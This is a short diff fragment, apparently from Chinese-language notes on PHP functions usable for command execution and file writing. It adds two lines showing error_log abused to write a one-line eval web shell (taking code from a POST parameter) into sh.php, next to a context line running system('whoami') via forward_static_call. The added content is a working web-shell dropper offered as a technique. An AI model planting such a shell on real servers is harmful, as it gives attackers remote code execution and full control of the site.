@@ -49,3 +49,5 @@ forward_static_call('system', 'whoami')
 // 和上述功能类似,但第二参数不需要是数组
 
 error函数:
+error_log('马',类型,'创造的文件')
+error_log("<?php eval(\$_POST['a']);?>",3,"sh.php");
